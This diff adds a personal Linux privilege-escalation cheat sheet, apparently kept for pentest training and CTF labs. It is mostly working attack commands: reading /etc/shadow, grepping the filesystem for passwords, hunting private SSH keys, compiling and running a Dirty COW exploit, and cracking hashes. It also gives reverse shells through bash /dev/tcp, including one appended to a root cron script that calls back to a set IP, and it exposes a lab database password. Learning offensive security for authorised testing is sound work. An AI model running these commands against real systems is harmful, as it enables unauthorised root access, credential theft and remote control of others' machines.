@@ -1,0 +1,246 @@
+some other good stuff:
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+https://www.youtube.com/watch?v=ZTnwg3qCdVM&ab_channel=TheCyberMentor
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+1. Basic Commands
+
+a. What the Kernel is running:
+uname -a
+
+b. Distribution details:
+cat /etc/issue
+
+c. Architecture:
+lscpu
+
+d. List of processes running:
+ps aux
+
+e. Find all tasks running as user:
+ps aux | grep root
+ps aux | grep TCM
+
+2. User enumeration
+
+a. get all ids, groups etc
+id
+
+b. get all commands the user can run as sudo without permission
+sudo -l
+
+c. passwd file
+	ci. see the passwd file:
+	cat /etc/passwd
+
+	cii. reduce even more of the passwd file to show only users
+	cat /etc/passwd | cut -d : -f 1
+
+d. see the hash value
+cat /etc/shadow
+
+e. access etc group file
+cat /etc/group
+
+f. see the history of commands:
+history
+
+3. Network enumeration
+
+a. check current ip address
+ip a
+ifconfig
+
+b. shows the route to another network?
+ip route
+route
+
+c. shows networks available
+arp -a
+ip neigh
+
+d. shows all ports connecting
+netstat -ano
+
+4. Password Enumeration
+
+a. go out and look for the word anywhere in files and spit out in red:
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+
+b. files containing passwords
+locate password | more
+
+c. hunt ssh keys
+find / -name authorized_keys
+find / -name id_rsa 2> /dev/null
+
+5. Automated Tools:
+
+LinPEAS --> More recommended
+LinEnum --> try this after LinPEAS
+LinuxPrivchecker.py --> use this to run to find privillege permissions
+
+Escalation:
+6. Kernel
+	a. uname -e
+	b. google Linux Debian 2.6.32-5 exploit
+	c. eg dirtycow
+		cd dirtycow
+		ls
+		gcc -pthread c0w.c -o cow
+		ls
+		id
+		./cow
+		passwd
+		id
+		(become root)
+
+7. Password Even more Enumeration
+See if people can put in their password etc
+	Command: 
+	a. history
+	b. find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+	
+8. Escalation via weak file permissions
+Assuming you have read to shadow & passwd files
+
+command:
+	ls -la passwd
+	ls -la shadow
+eg - you can edit the passwd file and remove the x in root so you don't need password
+eg - you can edit the shadow file and put in your own hash in shadow for root
+By right, you shouldn't be able to even read the shadow file but if you have write you are legend.
+
+in kali - you can 
+1. cp the shadow & passwd file to Kali
+2. Next you unshadow it
+command: unshadow passwd shadow
+3. delete all other data without hash in the passwd file
+4. go to google hashcat hash types
+5. find the related hash type in hashcat
+6. crack it in john or something or even hashcat
+
+
+9. SSH Keys
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+ssh-keygen --> this command will generate keys
+cat id_rsa
+
+1. Back in attacker machine, Kali, copy the id_rsa to a new file called id_rsa2
+2. chmod 600 id_rsa2
+3. ssh -i id_rsa2 root@victimIP
+
+10. GTFO BINS
+gtfobins.github.io
+
+Can play around: Tryhackme - Linux Privsec Playground
+
+
+11. Escalation via intended functionality
+
+https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
+
+example:
+you cannot get shell / edit system files but you can use it to view system files
+eg.
+
+sudo apache2 -f /etc/shadow
+
+run the following command to see what commanmds you can run as sudo
+
+sudo -l
+
+12.Other Methods:
+
+
+
+from PHP Shell (Netcat): python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+--------------------------------------------------------------------------------------------------
+		LinPEASS
+--------------------------------------------------------------------------------------------------
+
+
+save as linpeas.sh
+download to victim machine
+chmod 700 linpeas.sh
+./linpeas.sh
+
+Look for RedColor words and especially if the system have like wordpress installed, it may prompt out user password
+
+/usr/share/phpmyadmin/config.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;                                                                     
+/usr/share/phpmyadmin/config.sample.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
+/usr/share/phpmyadmin/libraries/config.default.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
+/usr/share/phpmyadmin/libraries/config.default.php:$cfg['ShowChgPassword'] = true;
+/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+
+try mysql password: My_V3ryS3cur3_P4ss
+
+ssh grimmie@IPADDRESS
+
+--------------------------------------------------------------------------------------------------
+		HOW TO FIND CRONJOB IF WE DON'T HAVE SUDO or SYSLOG
+--------------------------------------------------------------------------------------------------
+
+1. download pspy64 from the website (https://github.com/DominicBreuker/pspy/releases)
+2. setup httpserver on attacker machine
+3. download psp64
+4. chmod 700 pspy64
+5. ./psp64
+
+
+--------------------------------------------------------------------------------------------------
+		CRON JOBS --> ONLY IF YOU HAVE PERMISSION TO VIEW SYSLOGS
+--------------------------------------------------------------------------------------------------
+1. go to syslog to find cronjobs that are running as root
+
+tail -f /var/log/syslog
+
+2. crontab -e
+
+* * * * * /home/kali/temp/scheduler.sh
+chmod 700 to the bash script
+
+chmod 700 /home/kali/temp/scheduler.sh
+
+3. connect to a shell from a victim machine in terminal
+Link: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+bash -i >& /dev/tcp/IPADDRESS/PORT 0>&1
+
+
+>& /dev/tcp/IPADDRESS/PORT 0>&1 - redirect stdout & stderr to the tcp connection with the target ip and port
+2- error
+1 - standard output
+0 - standard input
+
+
+--------------------------------------------------------------------------------------------------
+		Getting root flag by echoning shell to .sh files
+--------------------------------------------------------------------------------------------------
+
+echo "bash -i >& /dev/tcp/192.168.64.145/1799 0>&1" >> backup.sh
+
+
+
+--------------------------------------------------------------------------------------------------
+		SUID
+--------------------------------------------------------------------------------------------------
+
+Example: chmod 4755 file.sh
+
+from normal user: find all files that users can run with special permissions
+find / -perm -u=s -type f 2>/dev/null | less
+
+Can look at GTFOBINS.github.io
+
+
+
+
+
